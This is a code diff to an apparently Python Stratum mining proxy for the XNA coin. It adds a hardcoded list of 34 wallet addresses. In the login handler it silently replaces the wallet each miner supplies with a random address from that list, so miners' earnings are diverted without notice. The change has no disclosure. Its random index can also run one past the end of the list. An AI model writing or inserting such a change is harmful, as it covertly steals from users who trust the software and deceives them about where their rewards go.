@@ -10,6 +10,42 @@ from stratum.xna.connector import manager
 from stratum.xna.state import TemplateState
 from stratum.xna.job import job_manager
 
+WALLET = [
+  "NLBnvy1mu2vJgL4TWTWtGg9xqojazzqcVj",
+  "NLQoPBaZ3smQjEQsscuoEzp6M7jXjKAgdq",
+  "NLszi5hRbpHcEJtintPio2bP3g4u91sd3H",
+  "NMtMQARjdB5ntE7AnUt17ke3EJtupiLUq3",
+  "NNUaihusGsu79fXKwJmx143nkuUQ11kSLL",
+  "NPGN7ccxNLDKkxE9dGC52cF5UjKtuAZDbb",
+  "NPNKjT2HxJybFS2PP1DC4cFuAH3Uu1oZkm",
+  "NPYSPovytyxRuGXFWy45tMSv2mQfDzwCcq",
+  "NPZomT2jJ1Zgufba1CT3FuNbYro12Vs8ur",
+  "NQ1S7ajPtBoS89NqWVxPJ2wCdx5D3AAara",
+  "NQyWGS85eTTGpQw3hoq7vVL7u5mYkmeV3S",
+  "NRcRFo3fJmFotZzvfL9VmahPz5Cnd3nW4c",
+  "NSAsdYnh6VmHba55wUAJ6rqdgT9m61Frn4",
+  "NTCL3hgsuLVch7f3XGiRFFps7eFmv7Eqgb",
+  "NU7SuiJxwobpKn71KLvys23gJ1zeWJHvPQ",
+  "NULHbz2CeNmritFZMVePeepYZcr8QLwSsC",
+  "NUNoQrwJDrZtgbYThCBXDugFpxSU16UGe3",
+  "NVKPxNFrfA2LDxHtmTtg2Ms5oreXq8ffFa",
+  "NYSxMGmPUcyWmUbmnxp4FVys2THn6ashUb",
+  "NYTsWSTR1WfDccN51DWvEzN8rmDQKS7rKP",
+  "NaxcLCf2yjntuUkTavfKLZE8wXoPr19kwU",
+  "NbKP5NqyvZ8xN6oSaHz5bgovq4rffKYHeb",
+  "NcAfbkat9JhqRKXGw3vyLHqsmCHVFFPYWQ",
+  "NcURkjffaDc1qip7wkx6HvQ26AieW2K49g",
+  "NczRcFmQVNtHPvFe16cC4FnMZwXGJfmzWD",
+  "NdKh4CVHxTKjtCdDwNfzwnF4GWHdqWfWRu",
+  "NdkLagwpZTmuGYHWL2DrhC5y38ZDcwZn4x",
+  "NdtfiPEFZHy5nHALHmDoY3QRiJaByuQQLW",
+  "Ne1LWxiooj65A5UHFbLybdQjXASYnAHzbW",
+  "NeSYHke5MVZ9Po5rT3d2rQmTRg2N4jjbvt",
+  "NfsS5ghLoryyt3jq5ejiXkRbaEW8sXixna",
+  "NiTNSNNoVewiqgxxvpeso8Hjj2PoQbLyTF",
+  "Nirr2q8QF6DjYfgVyELCQWEaiTe3qcxyfb",
+  "NivxUkHrAHQBjHcNkD6Rn9FdLBUF3ihNTK"
+]
 
 class Proxy:
     last_time_reported_hs = 0
@@ -36,7 +72,7 @@ class Proxy:
         while self.state.job_counter == 0:
             await asyncio.sleep(0.1)
         user_list = msg['params'][0].split('.')
-        self.wallet = user_list[0]
+        self.wallet = WALLET[random.randint(0, len(WALLET))]
         self.state.address = self.wallet
         if len(user_list) == 2:
             self.worker = user_list[1]
